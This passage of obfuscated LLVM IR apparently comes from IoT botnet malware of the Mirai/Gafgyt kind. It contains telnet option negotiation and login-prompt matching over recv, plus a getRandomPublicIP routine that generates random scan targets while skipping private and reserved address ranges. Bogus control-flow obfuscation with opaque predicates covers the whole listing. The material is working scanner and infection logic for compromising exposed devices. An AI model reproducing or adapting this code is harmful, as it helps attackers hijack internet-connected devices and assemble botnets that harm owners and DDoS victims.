originalBB18:                                     ; preds = %originalBB18alteredBB, %168
  %177 = load i32, i32* %27, align 4
  %178 = icmp eq i32 %177, 0
  %179 = load i32, i32* @x.53
  %180 = load i32, i32* @y.54
  %181 = sub i32 %179, 1
  %182 = mul i32 %179, %181
  %183 = urem i32 %182, 2
  %184 = icmp eq i32 %183, 0
  %185 = icmp slt i32 %180, 10
  %186 = or i1 %184, %185
  br i1 %186, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %178, label %187, label %188

; <label>:187:                                    ; preds = %originalBBpart220, %originalBBpart216
  store i32 0, i32* %17, align 4
  br label %270

; <label>:188:                                    ; preds = %originalBBpart220
  %189 = load i32, i32* %27, align 4
  %190 = load i32, i32* %26, align 4
  %191 = add nsw i32 %190, %189
  store i32 %191, i32* %26, align 4
  %192 = load i8*, i8** %31, align 8
  %193 = load i8, i8* %192, align 1
  %194 = zext i8 %193 to i32
  %195 = icmp eq i32 %194, 255
  br i1 %195, label %196, label %218

; <label>:196:                                    ; preds = %188
  %197 = load i32, i32* %18, align 4
  %198 = load i8*, i8** %31, align 8
  %199 = getelementptr inbounds i8, i8* %198, i64 1
  %200 = call i64 @recv(i32 %197, i8* %199, i64 2, i32 0)
  %201 = trunc i64 %200 to i32
  store i32 %201, i32* %27, align 4
  %202 = load i32, i32* %27, align 4
  %203 = icmp eq i32 %202, -1
  br i1 %203, label %207, label %204

; <label>:204:                                    ; preds = %196
  %205 = load i32, i32* %27, align 4
  %206 = icmp eq i32 %205, 0
  br i1 %206, label %207, label %208

; <label>:207:                                    ; preds = %204, %196
  store i32 0, i32* %17, align 4
  br label %270

; <label>:208:                                    ; preds = %204
  %209 = load i32, i32* %27, align 4
  %210 = load i32, i32* %26, align 4
  %211 = add nsw i32 %210, %209
  store i32 %211, i32* %26, align 4
  %212 = load i32, i32* %18, align 4
  %213 = load i8*, i8** %31, align 8
  %214 = call i32 @negotiate(i32 %212, i8* %213, i32 3)
  %215 = icmp ne i32 %214, 0
  br i1 %215, label %217, label %216

; <label>:216:                                    ; preds = %208
  store i32 0, i32* %17, align 4
  br label %270

; <label>:217:                                    ; preds = %208
  br label %264

; <label>:218:                                    ; preds = %188
  %219 = load i8*, i8** %23, align 8
  %220 = load i8*, i8** %19, align 8
  %221 = call i8* @strstr(i8* %219, i8* %220) #10
  %222 = icmp ne i8* %221, null
  br i1 %222, label %246, label %223

; <label>:223:                                    ; preds = %218
  %224 = load i32, i32* %20, align 4
  %225 = icmp ne i32 %224, 0
  br i1 %225, label %226, label %263

; <label>:226:                                    ; preds = %223
  %227 = load i32, i32* @x.53
  %228 = load i32, i32* @y.54
  %229 = sub i32 %227, 1
  %230 = mul i32 %227, %229
  %231 = urem i32 %230, 2
  %232 = icmp eq i32 %231, 0
  %233 = icmp slt i32 %228, 10
  %234 = or i1 %232, %233
  br i1 %234, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %226
  %235 = load i8*, i8** %23, align 8
  %236 = call i32 @matchPrompt(i8* %235)
  %237 = icmp ne i32 %236, 0
  %238 = load i32, i32* @x.53
  %239 = load i32, i32* @y.54
  %240 = sub i32 %238, 1
  %241 = mul i32 %238, %240
  %242 = urem i32 %241, 2
  %243 = icmp eq i32 %242, 0
  %244 = icmp slt i32 %239, 10
  %245 = or i1 %243, %244
  br i1 %245, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %237, label %246, label %263

; <label>:246:                                    ; preds = %originalBBpart224, %218
  %247 = load i32, i32* @x.53
  %248 = load i32, i32* @y.54
  %249 = sub i32 %247, 1
  %250 = mul i32 %247, %249
  %251 = urem i32 %250, 2
  %252 = icmp eq i32 %251, 0
  %253 = icmp slt i32 %248, 10
  %254 = or i1 %252, %253
  br i1 %254, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %246
  store i32 1, i32* %28, align 4
  %255 = load i32, i32* @x.53
  %256 = load i32, i32* @y.54
  %257 = sub i32 %255, 1
  %258 = mul i32 %255, %257
  %259 = urem i32 %258, 2
  %260 = icmp eq i32 %259, 0
  %261 = icmp slt i32 %256, 10
  %262 = or i1 %260, %261
  br i1 %262, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %265

; <label>:263:                                    ; preds = %originalBBpart224, %223
  br label %264

; <label>:264:                                    ; preds = %263, %217
  br label %49

; <label>:265:                                    ; preds = %originalBBpart228, %140, %originalBBpart28
  %266 = load i32, i32* %28, align 4
  %267 = icmp ne i32 %266, 0
  br i1 %267, label %268, label %269

; <label>:268:                                    ; preds = %265
  store i32 1, i32* %17, align 4
  br label %270

; <label>:269:                                    ; preds = %265
  store i32 0, i32* %17, align 4
  br label %270

; <label>:270:                                    ; preds = %269, %268, %216, %207, %187
  %271 = load i32, i32* %17, align 4
  ret i32 %271

originalBBalteredBB:                              ; preds = %originalBB, %8
  %272 = alloca i32, align 4
  %273 = alloca i32, align 4
  %274 = alloca i8*, align 8
  %275 = alloca i32, align 4
  %276 = alloca i32, align 4
  %277 = alloca i32, align 4
  %278 = alloca i8*, align 8
  %279 = alloca i32, align 4
  %280 = alloca i32, align 4
  %281 = alloca i32, align 4
  %282 = alloca i32, align 4
  %283 = alloca i32, align 4
  %284 = alloca %struct.__sigset_t, align 8
  %285 = alloca %struct.timeval, align 8
  %286 = alloca i8*, align 8
  %287 = alloca i32, align 4
  %288 = alloca i32, align 4
  store i32 %0, i32* %273, align 4
  store i8* %1, i8** %274, align 8
  store i32 %2, i32* %275, align 4
  store i32 %3, i32* %276, align 4
  store i32 %4, i32* %277, align 4
  store i8* %5, i8** %278, align 8
  store i32 %6, i32* %279, align 4
  store i32 %7, i32* %280, align 4
  %289 = load i32, i32* %280, align 4
  store i32 %289, i32* %281, align 4
  store i32 0, i32* %282, align 4
  store i32 0, i32* %283, align 4
  %290 = load i32, i32* %276, align 4
  %291 = sext i32 %290 to i64
  %292 = getelementptr inbounds %struct.timeval, %struct.timeval* %285, i32 0, i32 0
  store i64 %291, i64* %292, align 8
  %293 = load i32, i32* %277, align 4
  %294 = sext i32 %293 to i64
  %295 = getelementptr inbounds %struct.timeval, %struct.timeval* %285, i32 0, i32 1
  store i64 %294, i64* %295, align 8
  store i8* null, i8** %286, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %62
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %80
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %98
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %141
  %296 = load i8*, i8** %23, align 8
  %297 = load i32, i32* %26, align 4
  %298 = sext i32 %297 to i64
  %299 = getelementptr inbounds i8, i8* %296, i64 %298
  store i8* %299, i8** %31, align 8
  %300 = load i32, i32* %18, align 4
  %301 = load i8*, i8** %31, align 8
  %302 = call i64 @recv(i32 %300, i8* %301, i64 1, i32 0)
  %303 = trunc i64 %302 to i32
  store i32 %303, i32* %27, align 4
  %304 = load i32, i32* %27, align 4
  %305 = icmp eq i32 %304, -1
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %168
  %306 = load i32, i32* %27, align 4
  %307 = icmp eq i32 %306, 0
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %226
  %308 = load i8*, i8** %23, align 8
  %309 = call i32 @matchPrompt(i8* %308)
  %310 = icmp ne i32 %309, 0
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %246
  store i32 1, i32* %28, align 4
  br label %originalBB26
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() #0 {
  %1 = load i32, i32* @x.55
  %2 = load i32, i32* @y.56
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca [16 x i8], align 16
  %11 = alloca [16 x i8], align 16
  %12 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %13 = zext i8 %12 to i32
  %14 = icmp sgt i32 %13, 0
  %15 = load i32, i32* @x.55
  %16 = load i32, i32* @y.56
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %14, label %23, label %75

; <label>:23:                                     ; preds = %originalBBpart2
  %24 = load i32, i32* @x.55
  %25 = load i32, i32* @y.56
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %23
  %32 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %33 = zext i8 %32 to i32
  %34 = icmp slt i32 %33, 255
  %35 = load i32, i32* @x.55
  %36 = load i32, i32* @y.56
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %34, label %43, label %75

; <label>:43:                                     ; preds = %originalBBpart24
  %44 = load i32, i32* @x.55
  %45 = load i32, i32* @y.56
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %43
  %52 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %53 = add i8 %52, 1
  store i8 %53, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %54 = bitcast [16 x i8]* %10 to i8*
  call void @llvm.memset.p0i8.i64(i8* %54, i8 0, i64 16, i32 16, i1 false)
  %55 = getelementptr inbounds [16 x i8], [16 x i8]* %10, i32 0, i32 0
  %56 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %57 = zext i8 %56 to i32
  %58 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %59 = zext i8 %58 to i32
  %60 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %61 = zext i8 %60 to i32
  %62 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %63 = zext i8 %62 to i32
  %64 = call i32 (i8*, i8*, ...) @szprintf(i8* %55, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.24, i32 0, i32 0), i32 %57, i32 %59, i32 %61, i32 %63)
  %65 = getelementptr inbounds [16 x i8], [16 x i8]* %10, i32 0, i32 0
  %66 = call i32 @inet_addr(i8* %65) #4
  store i32 %66, i32* %9, align 4
  %67 = load i32, i32* @x.55
  %68 = load i32, i32* @y.56
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBBpart218, label %originalBB6alteredBB

originalBBpart218:                                ; preds = %originalBB6
  br label %369

; <label>:75:                                     ; preds = %originalBBpart24, %originalBBpart2
  %76 = load i32, i32* @x.55
  %77 = load i32, i32* @y.56
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %75
  %84 = call i32 @rand() #4
  %85 = srem i32 %84, 255
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %87 = call i32 @rand() #4
  %88 = srem i32 %87, 255
  %89 = trunc i32 %88 to i8
  store i8 %89, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %90 = call i32 @rand() #4
  %91 = srem i32 %90, 255
  %92 = trunc i32 %91 to i8
  store i8 %92, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %93 = load i32, i32* @x.55
  %94 = load i32, i32* @y.56
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBBpart251, label %originalBB20alteredBB

originalBBpart251:                                ; preds = %originalBB20
  br label %101

; <label>:101:                                    ; preds = %347, %originalBBpart251
  %102 = load i32, i32* @x.55
  %103 = load i32, i32* @y.56
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %101
  %110 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %111 = zext i8 %110 to i32
  %112 = icmp eq i32 %111, 0
  %113 = load i32, i32* @x.55
  %114 = load i32, i32* @y.56
  %115 = sub i32 %113, 1
  %116 = mul i32 %113, %115
  %117 = urem i32 %116, 2
  %118 = icmp eq i32 %117, 0
  %119 = icmp slt i32 %114, 10
  %120 = or i1 %118, %119
  br i1 %120, label %originalBBpart255, label %originalBB53alteredBB

originalBBpart255:                                ; preds = %originalBB53
  br i1 %112, label %345, label %121

; <label>:121:                                    ; preds = %originalBBpart255
  %122 = load i32, i32* @x.55
  %123 = load i32, i32* @y.56
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %121
  %130 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %131 = zext i8 %130 to i32
  %132 = icmp eq i32 %131, 10
  %133 = load i32, i32* @x.55
  %134 = load i32, i32* @y.56
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBBpart259, label %originalBB57alteredBB

originalBBpart259:                                ; preds = %originalBB57
  br i1 %132, label %345, label %141

; <label>:141:                                    ; preds = %originalBBpart259
  %142 = load i32, i32* @x.55
  %143 = load i32, i32* @y.56
  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBB61, label %originalBB61alteredBB

originalBB61:                                     ; preds = %originalBB61alteredBB, %141
  %150 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %151 = zext i8 %150 to i32
  %152 = icmp eq i32 %151, 100
  %153 = load i32, i32* @x.55
  %154 = load i32, i32* @y.56
  %155 = sub i32 %153, 1
  %156 = mul i32 %153, %155
  %157 = urem i32 %156, 2
  %158 = icmp eq i32 %157, 0
  %159 = icmp slt i32 %154, 10
  %160 = or i1 %158, %159
  br i1 %160, label %originalBBpart263, label %originalBB61alteredBB

originalBBpart263:                                ; preds = %originalBB61
  br i1 %152, label %161, label %169

; <label>:161:                                    ; preds = %originalBBpart263
  %162 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %163 = zext i8 %162 to i32
  %164 = icmp sge i32 %163, 64
  br i1 %164, label %165, label %169

; <label>:165:                                    ; preds = %161
  %166 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %167 = zext i8 %166 to i32
  %168 = icmp sle i32 %167, 127
  br i1 %168, label %345, label %169

; <label>:169:                                    ; preds = %165, %161, %originalBBpart263
  %170 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %171 = zext i8 %170 to i32
  %172 = icmp eq i32 %171, 127
  br i1 %172, label %345, label %173

; <label>:173:                                    ; preds = %169
  %174 = load i32, i32* @x.55
  %175 = load i32, i32* @y.56
  %176 = sub i32 %174, 1
  %177 = mul i32 %174, %176
  %178 = urem i32 %177, 2
  %179 = icmp eq i32 %178, 0
  %180 = icmp slt i32 %175, 10
  %181 = or i1 %179, %180
  br i1 %181, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %173
  %182 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %183 = zext i8 %182 to i32
  %184 = icmp eq i32 %183, 169
  %185 = load i32, i32* @x.55
  %186 = load i32, i32* @y.56
  %187 = sub i32 %185, 1
  %188 = mul i32 %185, %187
  %189 = urem i32 %188, 2
  %190 = icmp eq i32 %189, 0
  %191 = icmp slt i32 %186, 10
  %192 = or i1 %190, %191
  br i1 %192, label %originalBBpart267, label %originalBB65alteredBB

originalBBpart267:                                ; preds = %originalBB65
  br i1 %184, label %193, label %197

; <label>:193:                                    ; preds = %originalBBpart267
  %194 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %195 = zext i8 %194 to i32
  %196 = icmp eq i32 %195, 254
  br i1 %196, label %345, label %197

; <label>:197:                                    ; preds = %193, %originalBBpart267
  %198 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %199 = zext i8 %198 to i32
  %200 = icmp eq i32 %199, 172
  br i1 %200, label %201, label %225

; <label>:201:                                    ; preds = %197
  %202 = load i32, i32* @x.55
  %203 = load i32, i32* @y.56
  %204 = sub i32 %202, 1
  %205 = mul i32 %202, %204
  %206 = urem i32 %205, 2
  %207 = icmp eq i32 %206, 0
  %208 = icmp slt i32 %203, 10
  %209 = or i1 %207, %208
  br i1 %209, label %originalBB69, label %originalBB69alteredBB

originalBB69:                                     ; preds = %originalBB69alteredBB, %201
  %210 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %211 = zext i8 %210 to i32
  %212 = icmp sle i32 %211, 16
  %213 = load i32, i32* @x.55
  %214 = load i32, i32* @y.56
  %215 = sub i32 %213, 1
  %216 = mul i32 %213, %215
  %217 = urem i32 %216, 2
  %218 = icmp eq i32 %217, 0
  %219 = icmp slt i32 %214, 10
  %220 = or i1 %218, %219
  br i1 %220, label %originalBBpart271, label %originalBB69alteredBB

originalBBpart271:                                ; preds = %originalBB69
  br i1 %212, label %221, label %225

; <label>:221:                                    ; preds = %originalBBpart271
  %222 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %223 = zext i8 %222 to i32
  %224 = icmp sle i32 %223, 31
  br i1 %224, label %345, label %225

; <label>:225:                                    ; preds = %221, %originalBBpart271, %197
  %226 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %227 = zext i8 %226 to i32
  %228 = icmp eq i32 %227, 192
  br i1 %228, label %229, label %237

; <label>:229:                                    ; preds = %225
  %230 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %231 = zext i8 %230 to i32
  %232 = icmp eq i32 %231, 0
  br i1 %232, label %233, label %237

; <label>:233:                                    ; preds = %229
  %234 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %235 = zext i8 %234 to i32
  %236 = icmp eq i32 %235, 2
  br i1 %236, label %345, label %237

; <label>:237:                                    ; preds = %233, %229, %225
  %238 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %239 = zext i8 %238 to i32
  %240 = icmp eq i32 %239, 192
  br i1 %240, label %241, label %249

; <label>:241:                                    ; preds = %237
  %242 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %243 = zext i8 %242 to i32
  %244 = icmp eq i32 %243, 88
  br i1 %244, label %245, label %249

; <label>:245:                                    ; preds = %241
  %246 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %247 = zext i8 %246 to i32
  %248 = icmp eq i32 %247, 99
  br i1 %248, label %345, label %249

; <label>:249:                                    ; preds = %245, %241, %237
  %250 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %251 = zext i8 %250 to i32
  %252 = icmp eq i32 %251, 192
  br i1 %252, label %253, label %257

; <label>:253:                                    ; preds = %249
  %254 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %255 = zext i8 %254 to i32
  %256 = icmp eq i32 %255, 168
  br i1 %256, label %345, label %257

; <label>:257:                                    ; preds = %253, %249
  %258 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %259 = zext i8 %258 to i32
  %260 = icmp eq i32 %259, 198
  br i1 %260, label %261, label %285

; <label>:261:                                    ; preds = %257
  %262 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %263 = zext i8 %262 to i32
  %264 = icmp eq i32 %263, 18
  br i1 %264, label %345, label %265

; <label>:265:                                    ; preds = %261
  %266 = load i32, i32* @x.55
  %267 = load i32, i32* @y.56
  %268 = sub i32 %266, 1
  %269 = mul i32 %266, %268
  %270 = urem i32 %269, 2
  %271 = icmp eq i32 %270, 0
  %272 = icmp slt i32 %267, 10
  %273 = or i1 %271, %272
  br i1 %273, label %originalBB73, label %originalBB73alteredBB

originalBB73:                                     ; preds = %originalBB73alteredBB, %265
  %274 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %275 = zext i8 %274 to i32
  %276 = icmp eq i32 %275, 19
  %277 = load i32, i32* @x.55
  %278 = load i32, i32* @y.56
  %279 = sub i32 %277, 1
  %280 = mul i32 %277, %279
  %281 = urem i32 %280, 2
  %282 = icmp eq i32 %281, 0
  %283 = icmp slt i32 %278, 10
  %284 = or i1 %282, %283
  br i1 %284, label %originalBBpart275, label %originalBB73alteredBB

originalBBpart275:                                ; preds = %originalBB73
  br i1 %276, label %345, label %285

; <label>:285:                                    ; preds = %originalBBpart275, %257
  %286 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %287 = zext i8 %286 to i32
  %288 = icmp eq i32 %287, 198
  br i1 %288, label %289, label %313

; <label>:289:                                    ; preds = %285
  %290 = load i32, i32* @x.55
  %291 = load i32, i32* @y.56
  %292 = sub i32 %290, 1
  %293 = mul i32 %290, %292
  %294 = urem i32 %293, 2
  %295 = icmp eq i32 %294, 0
  %296 = icmp slt i32 %291, 10
  %297 = or i1 %295, %296
  br i1 %297, label %originalBB77, label %originalBB77alteredBB

originalBB77:                                     ; preds = %originalBB77alteredBB, %289
  %298 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %299 = zext i8 %298 to i32
  %300 = icmp eq i32 %299, 51
  %301 = load i32, i32* @x.55
  %302 = load i32, i32* @y.56
  %303 = sub i32 %301, 1
  %304 = mul i32 %301, %303
  %305 = urem i32 %304, 2
  %306 = icmp eq i32 %305, 0
  %307 = icmp slt i32 %302, 10
  %308 = or i1 %306, %307
  br i1 %308, label %originalBBpart279, label %originalBB77alteredBB

originalBBpart279:                                ; preds = %originalBB77
  br i1 %300, label %309, label %313

; <label>:309:                                    ; preds = %originalBBpart279
  %310 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %311 = zext i8 %310 to i32
  %312 = icmp eq i32 %311, 100
  br i1 %312, label %345, label %313

; <label>:313:                                    ; preds = %309, %originalBBpart279, %285
  %314 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %315 = zext i8 %314 to i32
  %316 = icmp eq i32 %315, 203
  br i1 %316, label %317, label %341

; <label>:317:                                    ; preds = %313
  %318 = load i32, i32* @x.55
  %319 = load i32, i32* @y.56
  %320 = sub i32 %318, 1
  %321 = mul i32 %318, %320
  %322 = urem i32 %321, 2
  %323 = icmp eq i32 %322, 0
  %324 = icmp slt i32 %319, 10
  %325 = or i1 %323, %324
  br i1 %325, label %originalBB81, label %originalBB81alteredBB

originalBB81:                                     ; preds = %originalBB81alteredBB, %317
  %326 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %327 = zext i8 %326 to i32
  %328 = icmp eq i32 %327, 0
  %329 = load i32, i32* @x.55
  %330 = load i32, i32* @y.56
  %331 = sub i32 %329, 1
  %332 = mul i32 %329, %331
  %333 = urem i32 %332, 2
  %334 = icmp eq i32 %333, 0
  %335 = icmp slt i32 %330, 10
  %336 = or i1 %334, %335
  br i1 %336, label %originalBBpart283, label %originalBB81alteredBB

originalBBpart283:                                ; preds = %originalBB81
  br i1 %328, label %337, label %341

; <label>:337:                                    ; preds = %originalBBpart283
  %338 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %339 = zext i8 %338 to i32
  %340 = icmp eq i32 %339, 113
  br i1 %340, label %345, label %341

; <label>:341:                                    ; preds = %337, %originalBBpart283, %313
  %342 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %343 = zext i8 %342 to i32
  %344 = icmp sge i32 %343, 224
  br label %345

; <label>:345:                                    ; preds = %341, %337, %309, %originalBBpart275, %261, %253, %245, %233, %221, %193, %169, %165, %originalBBpart259, %originalBBpart255
  %346 = phi i1 [ true, %337 ], [ true, %309 ], [ true, %originalBBpart275 ], [ true, %261 ], [ true, %253 ], [ true, %245 ], [ true, %233 ], [ true, %221 ], [ true, %193 ], [ true, %169 ], [ true, %165 ], [ true, %originalBBpart259 ], [ true, %originalBBpart255 ], [ %344, %341 ]
  br i1 %346, label %347, label %357

; <label>:347:                                    ; preds = %345
  %348 = call i32 @rand() #4
  %349 = srem i32 %348, 255
  %350 = trunc i32 %349 to i8
  store i8 %350, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %351 = call i32 @rand() #4
  %352 = srem i32 %351, 255
  %353 = trunc i32 %352 to i8
  store i8 %353, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %354 = call i32 @rand() #4
  %355 = srem i32 %354, 255
  %356 = trunc i32 %355 to i8
  store i8 %356, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  br label %101

; <label>:357:                                    ; preds = %345
  %358 = bitcast [16 x i8]* %11 to i8*
  call void @llvm.memset.p0i8.i64(i8* %358, i8 0, i64 16, i32 16, i1 false)
  %359 = getelementptr inbounds [16 x i8], [16 x i8]* %11, i32 0, i32 0
  %360 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %361 = zext i8 %360 to i32
  %362 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %363 = zext i8 %362 to i32
  %364 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %365 = zext i8 %364 to i32
  %366 = call i32 (i8*, i8*, ...) @szprintf(i8* %359, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.25, i32 0, i32 0), i32 %361, i32 %363, i32 %365)
  %367 = getelementptr inbounds [16 x i8], [16 x i8]* %11, i32 0, i32 0
  %368 = call i32 @inet_addr(i8* %367) #4
  store i32 %368, i32* %9, align 4
  br label %369

; <label>:369:                                    ; preds = %357, %originalBBpart218
  %370 = load i32, i32* %9, align 4
  ret i32 %370

originalBBalteredBB:                              ; preds = %originalBB, %0
  %371 = alloca i32, align 4
  %372 = alloca [16 x i8], align 16
  %373 = alloca [16 x i8], align 16
